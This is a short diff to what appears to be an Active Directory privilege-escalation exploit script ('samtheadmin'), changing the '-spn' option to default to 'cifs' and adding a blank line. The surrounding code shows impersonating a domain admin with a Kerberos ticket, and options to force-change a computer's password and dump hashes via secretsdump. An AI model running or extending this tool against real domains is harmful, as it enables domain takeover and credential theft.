@@ -242,6 +242,7 @@ def samtheadmin(username, password, domain, options):
         logging.error('Cannot restore the old name lol')
 
     os.environ["KRB5CCNAME"] = dcticket
+
     try:
         executer = GETST(None, None, domain, options,
                          impersonate_target=domain_admin,
@@ -292,7 +293,7 @@ if __name__ == '__main__':
     parser.add_argument('-no-add', action='store_true', help='Forcibly change the password of the target computer.')
     parser.add_argument('-create-child', action='store_true', help='Current account have permission to CreateChild.')
     parser.add_argument('-dump', action='store_true', help='Dump Hashs via secretsdump')
-    parser.add_argument('-spn', help='Specify the SPN for the ticket',  required=True)
+    parser.add_argument('-spn', help='Specify the SPN for the ticket (Default: cifs)',  default='cifs')
 
     group = parser.add_argument_group('authentication')
     group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
